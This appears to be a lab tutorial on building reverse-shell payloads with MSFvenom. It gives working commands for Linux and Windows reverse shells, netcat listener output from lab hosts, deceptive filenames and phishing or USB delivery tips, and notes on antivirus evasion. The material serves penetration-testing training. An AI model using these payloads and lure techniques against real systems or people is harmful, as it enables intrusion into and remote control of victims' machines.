# Crafting Payloads with MSFvenom

**[MSFvenom](https://www.metasploit.com/)** is the payload generation utility within Metasploit Framework, combining the functionality of the legacy `msfpayload` and `msfencode` tools into a single interface. It addresses a critical operational gap: Metasploit's exploit modules require direct network access to the target, but there are many scenarios where that access does not exist. MSFvenom generates standalone payload files that can be delivered through alternative vectors such as phishing emails, download links, USB drives, or any other social engineering mechanism, then executed independently of a live Metasploit connection.

## Staged vs. Stageless Payloads

Understanding the distinction between staged and stageless payloads is fundamental to selecting the right option for a given environment.

**Staged payloads** operate in two phases. A small, lightweight stager is delivered to and executed on the target first. That stager calls back to the operator's listener, downloads the remainder of the payload (the stage) over the network, and executes it in memory. This keeps the initial binary small but introduces a dependency on a stable network connection for stage delivery; unstable or high-latency links can cause the session to fail.

**Stageless payloads** contain the complete shellcode in a single self-contained file. No callback is required to download additional components; execution immediately establishes the shell session. This makes them more reliable on congested or high-latency links and reduces network traffic during delivery, which can benefit evasion when the payload is delivered via social engineering.

The payload name encodes which type is in use. A forward slash separating shell components indicates a staged payload; an underscore combining them indicates a stageless payload:

| Payload Name | Type | Reason |
|---|---|---|
| `linux/x86/shell/reverse_tcp` | Staged | `/shell/` and `/reverse_tcp` are separate stages |
| `linux/x86/shell_reverse_tcp` | Stageless | `shell_reverse_tcp` is a single combined component |
| `windows/meterpreter/reverse_tcp` | Staged | `/meterpreter/` and `/reverse_tcp` are separate stages |
| `windows/meterpreter_reverse_tcp` | Stageless | `meterpreter_reverse_tcp` is a single combined component |

When the name does not make the type immediately apparent, the description in `msfvenom -l payloads` output will state whether the payload is staged or stageless explicitly.

## Building a Stageless Linux Payload

List all available payloads to identify the correct name for the target platform:

```bash
msfvenom -l payloads
```

Build a stageless 64-bit Linux reverse shell as an ELF binary:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

Each flag serves a specific purpose:

| Flag / Argument | Purpose |
|---|---|
| `-p linux/x64/shell_reverse_tcp` | Specifies the payload; a stageless 64-bit Linux reverse shell |
| `LHOST=10.10.14.113` | The operator's IP address the target will call back to |
| `LPORT=443` | The port the listener is running on |
| `-f elf` | Output format; produces an [ELF binary](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) suitable for Linux execution |
| `> createbackup.elf` | Writes the output to a file; the name should be chosen to appear legitimate and encourage execution |

The resulting file is 194 bytes on disk. With a Netcat listener running on port 443, executing the file on the target produces the following:

```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
```

## Delivery Vectors

Once generated, the payload must reach the target through an available channel. Common delivery methods include:

- An email with the file attached, crafted to appear legitimate and relevant to the recipient
- A download link hosted on an attacker-controlled web server
- A USB drive used during an onsite physical engagement
- Delivery via an existing Metasploit session on the internal network

The filename matters. A file named `createbackup.elf` is more likely to be executed by a system administrator managing scripts and configuration backups than a file with an obviously suspicious name. On Windows, names such as `BonusCompensationPlanpdf.exe` exploit the tendency of users to trust documents that appear to carry useful or anticipated content.

## Building a Stageless Windows Payload

The same command structure applies for a Windows executable target:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

The only changes from the Linux build are the payload (`windows/shell_reverse_tcp`), which targets 32-bit Windows, and the output format (`-f exe`), which produces a Windows PE executable. The resulting file is 73,802 bytes. With AV disabled, a double-click from the target user is sufficient to trigger execution and establish the shell:

```bash
sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Downloads>
```

## AV Considerations

A raw, unencoded msfvenom executable is reliably detected by **[Windows Defender](https://www.microsoft.com/en-gb/windows/comprehensive-security)** and most modern endpoint protection solutions when real-time monitoring is active. The payload in this section is suitable for environments where AV is disabled or absent. Encoding passes using `x86/shikata_ga_nai` add a degree of obfuscation against static signature detection but do not constitute a robust evasion strategy against behavioural analysis engines. Producing payloads that survive modern endpoint detection requires more advanced techniques beyond the scope of this section, including custom loaders, process injection, and obfuscated delivery mechanisms.
